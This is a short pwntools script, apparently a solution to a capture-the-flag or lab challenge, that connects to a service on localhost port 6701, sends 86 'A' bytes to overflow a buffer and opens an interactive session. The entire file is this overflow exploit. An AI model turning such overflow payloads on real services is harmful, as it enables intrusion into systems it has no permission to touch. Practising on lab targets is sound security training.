from pwn import *
r = remote("localhost",6701)
payload = b'A'*86
r.sendline(payload)
r.interactive()
